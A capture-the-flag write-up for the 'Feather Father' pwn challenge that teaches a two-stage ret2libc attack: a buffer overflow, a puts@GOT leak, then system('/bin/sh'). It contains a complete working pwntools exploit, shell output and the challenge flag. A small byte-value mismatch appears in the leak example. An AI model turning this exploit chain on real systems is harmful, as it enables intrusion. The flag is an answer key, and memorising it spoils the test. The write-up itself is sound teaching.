# Feather Father - CTF Writeup

**Challenge:** Feather Father  
**Category:** Binary Exploitation (PWN)  
**Difficulty:** Beginner-Intermediate  
**Flag:** `V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}`

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Static Analysis](#static-analysis)
4. [Understanding the Vulnerability](#understanding-the-vulnerability)
5. [Dynamic Analysis with GDB](#dynamic-analysis-with-gdb)
6. [Exploitation Strategy](#exploitation-strategy)
7. [Understanding the Leak Mechanism](#understanding-the-leak-mechanism)
8. [Understanding Function Calling Convention](#understanding-function-calling-convention)
9. [Building the Exploit](#building-the-exploit)
10. [Final Exploit](#final-exploit)
11. [Key Takeaways](#key-takeaways)

---

## Challenge Overview

The challenge provides a 32-bit ELF binary called `chall` along with its associated libc (`libc.so.6`) and dynamic linker (`ld-linux.so.2`). The challenge description hints at a "familiar tune," suggesting a classic exploitation technique.

**Connection:** `nc chall.v1t.site 30212`

**Files provided:**
- `chall` - The vulnerable binary
- `libc.so.6` - The libc library
- `ld-linux.so.2` - The dynamic linker

---

## Initial Analysis

### File Information

```bash
$ file chall
chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
dynamically linked, interpreter ld-linux.so.2, 
for GNU/Linux 3.2.0, not stripped
```

### Security Protections

```bash
$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   No canary found   NX enabled    No PIE
```

**Protection Analysis:**
- ✅ **NX Enabled** - Stack is not executable (can't run shellcode)
- ❌ **No Stack Canary** - Buffer overflow is possible
- ❌ **No PIE** - Binary addresses are fixed (easier exploitation)
- ⚠️ **Partial RELRO** - GOT is writable (not needed for this exploit)

### Running the Binary

```bash
$ ./chall
-------------------
  Feather Maker  
-------------------
Make your own feather here!
hello
```

The program prints a banner and waits for input.

---

## Static Analysis

### Using pwninit

Before analyzing, we patch the binary with the provided libc:

```bash
$ pwninit --bin chall --libc libc.so.6 --ld ld-linux.so.2
```

This creates `chall_patched` which uses the correct libc version.

### Searching for Easy Wins

```bash
# Check for useful strings
$ strings chall | grep -i "flag\|shell\|bin\|cat"
_dl_relocate_static_pie

# Check for interesting functions
$ rabin2 -s chall | grep -E "win|flag|shell|cat|exec"
# Nothing interesting found
```

**Result:** No easy win functions or "/bin/sh" strings in the binary.

### Disassembly Analysis

```bash
$ objdump -d chall_patched | grep "@plt"
08049030 <setbuf@plt>:
08049040 <__libc_start_main@plt>:
08049050 <read@plt>:
08049060 <alarm@plt>:
08049070 <puts@plt>:
```

**Available functions:**
- `puts@plt` - Can be used to leak addresses
- `read@plt` - Used for input
- `setbuf@plt`, `alarm@plt` - Not useful for exploitation

### Key Functions in the Binary

#### 1. main()
```c
void main() {
    banner();
    vuln();
}
```

#### 2. banner()
Simply prints the ASCII art banner.

#### 3. vuln() - The Vulnerable Function

```asm
080491fd <vuln>:
 8049201:   sub    esp,0x134        # Allocate 308 bytes (0x134)
 8049214:   push   0x15e            # Read 350 bytes (0x15e)
 8049219:   lea    edx,[ebp-0x134]  # Buffer at ebp-0x134
 8049224:   call   8049050 <read@plt>
```

**Analysis:**
- Buffer size: 308 bytes (`ebp-0x134`)
- Read size: 350 bytes (`0x15e`)
- Overflow: 42 bytes beyond the buffer

---

## Understanding the Vulnerability

### Buffer Overflow Calculation

```
Buffer allocation: ebp - 0x134 = ebp - 308

Stack layout:
┌─────────────────────┐  ← EBP - 308
│   Buffer (308 bytes)│
├─────────────────────┤  ← EBP
│   Saved EBP (4)     │
├─────────────────────┤  ← EBP + 4 (Return Address)
│   Return Addr (4)   │
└─────────────────────┘

Offset to return address: 308 + 4 = 312 bytes
```

**We can overflow 42 bytes beyond the buffer**, which allows us to:
1. Overwrite saved EBP (4 bytes)
2. Overwrite return address (4 bytes)
3. Control stack data beyond return address (34 bytes)

---

## Dynamic Analysis with GDB

### Finding the Exact Offset

Using GDB with pwndbg:

```bash
$ gdb ./chall_patched
pwndbg> run
# Input: 'A' * 312 + 'BBBB'
```

**Result:**
```
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

*EIP  0x42424242 ('BBBB')
```

**Confirmed:** Offset to EIP is exactly 312 bytes.

---

## Exploitation Strategy

Since NX is enabled, we cannot execute shellcode on the stack. The strategy is **ret2libc**:

### Classic ret2libc Attack Flow

```
Stage 1: Leak libc address
─────────────────────────────
1. Call puts(puts@GOT) to leak libc address
2. Return to vuln() for second exploitation
3. Calculate libc base address

Stage 2: Execute system("/bin/sh")
─────────────────────────────────
1. Calculate system() and "/bin/sh" addresses
2. Call system("/bin/sh")
3. Get shell!
```

### Why This Works

**Key Insight:** Although ASLR randomizes where libc is loaded in memory, the **offsets within libc remain constant**.

If we know:
- `puts()` is at offset `0x00078140` in libc
- We leak that `puts()` is at `0xf7d5f140` at runtime

Then:
```
libc_base = 0xf7d5f140 - 0x00078140 = 0xf7ce7000

system() = libc_base + 0x00050430 = 0xf7d37430
/bin/sh  = libc_base + 0x001c4de8 = 0xf7eabde8
```

### Finding Offsets in libc

```bash
# Find system() offset
$ readelf -s libc.so.6 | grep " system"
1147: 00050430    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0

# Find /bin/sh string offset
$ strings -a -t x libc.so.6 | grep "/bin/sh"
1c4de8 /bin/sh

# Find puts() offset
$ readelf -s libc.so.6 | grep " puts@@"
257: 00078140   556 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.0
```

**Summary:**
- `system()`: `0x00050430`
- `/bin/sh`: `0x001c4de8`
- `puts()`: `0x00078140`

---

## Understanding the Leak Mechanism

### Common Confusion: What is GOT and PLT?

#### The Global Offset Table (GOT)

The GOT is a table that stores the **actual runtime addresses** of dynamically linked functions.

```
┌────────────────────────────────────────┐
│  Your Binary (chall_patched)           │
├────────────────────────────────────────┤
│  Code:                                 │
│    call puts@plt  ────────┐            │
│                           │            │
├───────────────────────────┼────────────┤
│  PLT (Procedure Linkage Table)        │
│    puts@plt:              │            │
│      jmp [puts@got] ◄─────┘            │
│                     │                  │
├─────────────────────┼──────────────────┤
│  GOT (Global Offset Table)            │
│    puts@got: 0xf7d5f140 ◄──┘           │
│    read@got: 0xf7eb1e10                │
│    alarm@got: 0xf7e67470               │
└────────────────────────────────────────┘
```

**Key Points:**
- GOT contains the **real libc addresses** at runtime
- We can read these addresses to leak libc
- GOT address: `0x0804c010` (fixed, no PIE)

### How We Leak the Address

Our payload calls `puts(puts@GOT)`:

```python
payload = flat(
    b'A' * 312,
    elf.plt['puts'],      # Call puts()
    elf.symbols['vuln'],  # Return here after puts
    elf.got['puts']       # Argument: address of GOT entry
)
```

**What happens:**
1. `puts()` receives the argument `0x0804c010` (address of puts@GOT)
2. `puts()` reads the value **at** `0x0804c010`
3. Value at `0x0804c010` is `0xf7d5f140` (real puts address in libc)
4. `puts()` prints these bytes: `\x40\x51\xd5\xf7`
5. We receive the leak!

---

## Understanding Function Calling Convention

### The Most Confusing Part

**Question:** Why is the return address in the "middle" of the stack? Why does puts() think ESP is the return address?

**Answer:** This follows the 32-bit x86 calling convention.

### The Fundamental Rule

When **ANY** function is called in 32-bit x86, it expects the stack to look like this:

```
┌──────────────────┐  ← ESP (Stack Pointer)
│  Return Address  │  Where to go after function ends
├──────────────────┤  ← ESP + 4
│  Argument 1      │  First parameter
├──────────────────┤  ← ESP + 8
│  Argument 2      │  Second parameter
└──────────────────┘
```

**This is a CONVENTION that ALL functions follow blindly.**

### Normal Function Call vs ROP

#### Normal Call:

```asm
push   argument      # Push argument onto stack
call   puts          # 1. Push return address
                     # 2. Jump to puts
```

**Stack becomes:**
```
┌──────────────────┐  ← ESP
│  return_address  │  (pushed by 'call')
├──────────────────┤  ← ESP + 4
│  argument        │  (pushed by 'push')
└──────────────────┘
```

#### ROP Chain (Our Exploit):

```asm
# We craft the stack via overflow:
[padding][puts@plt][vuln][puts@got]

# Then vuln() executes:
ret                  # Pops puts@plt into EIP
```

**After ret, stack becomes:**
```
┌──────────────────┐  ← ESP (after ret moved it)
│  vuln            │  (puts thinks: return address)
├──────────────────┤  ← ESP + 4
│  puts@got        │  (puts thinks: my argument)
└──────────────────┘
```

**Key Insight:** `puts()` doesn't know HOW it was called. It just reads ESP and ESP+4!

### Detailed Execution Flow

Let's trace exactly what happens:

#### Step 1: vuln() returns

```
Stack before ret:
┌──────────────────┐  
│  'A' * 312       │  Buffer
├──────────────────┤  ← ESP (after leave)
│  0x08049070      │  puts@plt
├──────────────────┤  
│  0x080491fd      │  vuln
├──────────────────┤  
│  0x0804c010      │  puts@got
└──────────────────┘

ret instruction:
1. EIP = [ESP] = 0x08049070
2. ESP += 4
3. Jump to 0x08049070
```

#### Step 2: After ret

```
Stack now:
┌──────────────────┐  ← ESP (moved down)
│  0x080491fd      │  vuln
├──────────────────┤  ← ESP + 4
│  0x0804c010      │  puts@got
└──────────────────┘

CPU is at puts@plt (0x08049070)
```

#### Step 3: puts@plt executes

```asm
puts@plt:
    jmp [puts@got]   # Jump to real puts in libc
```

Now we're in the real `puts()` function at `0xf7d5f140`.

**Stack is still:**
```
┌──────────────────┐  ← ESP
│  0x080491fd      │  
├──────────────────┤  ← ESP + 4
│  0x0804c010      │  
└──────────────────┘
```

#### Step 4: Inside puts()

```c
void puts(char *s) {
    // puts() reads its argument from ESP+4
    char *arg = *(ESP + 4);  // arg = 0x0804c010
    
    // Print what's AT address 0x0804c010
    char *ptr = (char *)arg;
    // Memory[0x0804c010] = [40 51 d5 f7] = 0xf7d55140
    // Print these bytes!
    
    // When done, return to address at ESP
    return;  // EIP = [ESP] = 0x080491fd
}
```

**This is the leak!** puts() prints `\x40\x51\xd5\xf7` which we capture.

#### Step 5: puts() returns

```asm
ret    # EIP = [ESP] = 0x080491fd (vuln)
```

We're back in `vuln()` for Stage 2!

### The Key Concept

**Functions are BLIND to how they were called!**

They just follow the calling convention:
- ESP → Return address
- ESP+4 → First argument
- ESP+8 → Second argument

Whether you use `call` or craft the stack with ROP doesn't matter - the function reads the same locations!

### Analogy

Imagine `puts()` is a waiter who follows this rule:
- "The first paper (ESP) tells me which table to return to"
- "The second paper (ESP+4) is the customer's order"

**Normal scenario:** Customer calls waiter properly

**Our exploit:** We secretly place fake papers on the table

**Waiter can't tell the difference!** They just read the papers and follow instructions.

---

## Building the Exploit

### Stage 1: Leak libc

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
elf = ELF('./chall_patched')
libc = ELF('./libc.so.6')

io = remote('chall.v1t.site', 30212)

# Stage 1: Leak libc address
log.info("Stage 1: Leaking libc...")

payload1 = flat(
    b'A' * 312,           # Fill to return address
    elf.plt['puts'],      # Call puts@plt (0x08049070)
    elf.symbols['vuln'],  # Return to vuln after puts (0x080491fd)
    elf.got['puts']       # Argument: puts@GOT address (0x0804c010)
)

io.sendlineafter(b'here!\n', payload1)

# Receive the leak (4 bytes in 32-bit)
leaked_puts = u32(io.recv(4))
log.success(f"Leaked puts: {hex(leaked_puts)}")

# Calculate libc base
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")
```

**What this does:**
1. Overflows buffer with 312 'A's
2. Returns to `puts@plt`
3. `puts()` prints the value at `puts@GOT` (the real libc address)
4. `puts()` returns to `vuln()` for Stage 2
5. We calculate libc base from the leak

### Stage 2: Pop Shell

```python
# Calculate target addresses in libc
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

log.info(f"system() at: {hex(system_addr)}")
log.info(f"/bin/sh at: {hex(binsh_addr)}")

# Stage 2: Call system("/bin/sh")
log.info("Stage 2: Calling system('/bin/sh')...")

payload2 = flat(
    b'A' * 312,      # Fill to return address
    system_addr,     # Call system() in libc
    0xdeadbeef,      # Fake return address (we don't care)
    binsh_addr       # Argument: "/bin/sh" string address
)

io.sendline(payload2)
log.success("Shell spawned!")
io.interactive()
```

**What this does:**
1. Overflows buffer again (we're back in vuln)
2. Returns to `system()` in libc
3. `system()` reads argument from ESP+4 = "/bin/sh"
4. `system("/bin/sh")` executes → We get a shell!

---

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Load binaries
elf = ELF('./chall_patched')
libc = ELF('./libc.so.6')

# Connect to remote
io = remote('chall.v1t.site', 30212)

# ==================== STAGE 1: LEAK LIBC ====================
log.info("Stage 1: Leaking libc address...")

payload1 = flat(
    b'A' * 312,
    elf.plt['puts'],
    elf.symbols['vuln'],
    elf.got['puts']
)

io.sendlineafter(b'here!\n', payload1)

# Receive and parse leak
leaked_puts = u32(io.recv(4))
log.success(f"Leaked puts: {hex(leaked_puts)}")

# Calculate libc base
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# Calculate target addresses
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

log.info(f"system() at: {hex(system_addr)}")
log.info(f"/bin/sh at: {hex(binsh_addr)}")

# ==================== STAGE 2: GET SHELL ====================
log.info("Stage 2: Calling system('/bin/sh')...")

payload2 = flat(
    b'A' * 312,
    system_addr,
    0xdeadbeef,
    binsh_addr
)

io.sendline(payload2)

# ==================== INTERACT WITH SHELL ====================
log.success("Shell spawned! Getting flag...")
io.interactive()
```

### Execution Output

```bash
$ python3 exploit.py
[*] Stage 1: Leaking libc address...
[+] Leaked puts: 0xf7d5f140
[+] Libc base: 0xf7ce7000
[*] system() at: 0xf7d37430
[*] /bin/sh at: 0xf7eabde8
[*] Stage 2: Calling system('/bin/sh')...
[+] Shell spawned! Getting flag...
[*] Switching to interactive mode
$ ls
chall
flag.txt
ld-linux.so.2
libc.so.6
$ cat flag.txt
V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}
```

---

## Key Takeaways

### 1. Proper CTF Methodology

**Never write exploits before understanding the binary!**

Correct order:
1. ✅ Static analysis (checksec, strings, disassembly)
2. ✅ Dynamic analysis (GDB, find offset)
3. ✅ Plan exploitation strategy
4. ✅ Write exploit script
5. ✅ Test locally
6. ✅ Attack remote

### 2. ret2libc Fundamentals

**Two-stage attack:**
- **Stage 1:** Leak a libc address to defeat ASLR
- **Stage 2:** Use known offsets to call system("/bin/sh")

**Key formula:**
```
libc_base = leaked_address - function_offset
target_function = libc_base + target_offset
```

### 3. Function Calling Convention

In 32-bit x86:
```
ESP     → Return address
ESP+4   → First argument
ESP+8   → Second argument
```

Functions blindly read these locations - they don't care if you used `call` or ROP!

### 4. GOT and PLT

- **PLT** = Stub in your binary that jumps to GOT
- **GOT** = Table containing real libc addresses
- **Leaking GOT** = Reading real runtime addresses

### 5. ROP (Return Oriented Programming)

We use `ret` instructions to chain function calls:
```
[padding][func1][ret_addr][arg1][arg2]...
```

Each function returns to the next, creating a "chain" of execution.

### 6. Why This Challenge is Called "Feather Father"

**"Father"** → libc (the "parent" library)  
**"Feather"** → Light/simple  
**Combined:** A simple/classic ret2libc challenge!

The name is a play on "return to father (libc)".

---

## Common Pitfalls and Solutions

### Issue 1: Offset is Wrong

**Symptom:** Program crashes but not at your controlled address

**Solution:** Use cyclic pattern in GDB
```python
io.sendline(cyclic(350))
# Check crash address with: cyclic -l <address>
```

### Issue 2: Leak Doesn't Work

**Symptom:** Receive garbage or program crashes before leak

**Solution:** 
- Ensure GOT entry is resolved (call function first)
- Check you're reading correct number of bytes
- Add `io.recvline()` before `io.recv(4)` if needed

### Issue 3: Shell Doesn't Spawn

**Symptom:** Stage 2 crashes or hangs

**Solution:**
- Verify libc base calculation is correct
- Check system() and /bin/sh addresses
- Ensure you're returning to vuln() after stage 1

### Issue 4: Remote Libc Different

**Symptom:** Works locally but not remotely

**Solution:**
- Use provided libc for calculations
- Leak multiple addresses and use libc database
- Ensure pwninit patched binary correctly

---

## Alternative Approaches

### One Gadget

Instead of system("/bin/sh"), use a one_gadget:

```bash
$ one_gadget libc.so.6
0xe2ff0 execve("/bin/sh", [ebp-0x30], esi)
```

```python
one_gadget = libc.address + 0xe2ff0
payload2 = flat(b'A' * 312, one_gadget)
```

**Note:** One gadgets have constraints that may not be met.

### ROPchain for execve

Call `execve("/bin/sh", NULL, NULL)` directly:

```python
# Set registers: eax=0xb, ebx="/bin/sh", ecx=0, edx=0
# Then call int 0x80
```

More complex but avoids system() entirely.

---

## Resources for Further Learning

### Recommended Reading

1. **Exploit Education** - Practice binaries: https://exploit.education/
2. **pwn.college** - Comprehensive course: https://pwn.college/
3. **LiveOverflow Binary Exploitation** - YouTube series
4. **Nightmare** - CTF challenge collection: https://guyinatuxedo.github.io/

### Tools Used

- **pwntools** - Python exploitation framework
- **GDB + pwndbg** - Debugger with extensions
- **checksec** - Security properties checker
- **ROPgadget** - ROP gadget finder
- **one_gadget** - One gadget finder for libc
- **pwninit** - Binary patcher for CTFs

### Practice Challenges

Similar challenges to practice:
- picoCTF: buffer overflow series
- HackTheBox: ret2libc challenges
- pwnable.kr: simple pwn challenges
- ROP Emporium: ROP chain building

---

## Conclusion

This challenge demonstrates a classic **ret2libc** attack, which is a fundamental technique in binary exploitation. The key concepts learned:

1. **Buffer overflow** to gain control of execution flow
2. **Information leak** to defeat ASLR
3. **ROP** to chain function calls
4. **32-bit calling convention** and stack layout
5. **GOT/PLT** mechanism in dynamic linking

By understanding these fundamentals, you can tackle more advanced exploitation challenges involving:
- 64-bit binaries
- Stack canaries bypass
- PIE bypass
- Complex ROP chains
- Heap exploitation

**Remember:** The best way to learn binary exploitation is by doing! Practice on intentionally vulnerable binaries and gradually increase difficulty.

---
**Flag:** `V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}`
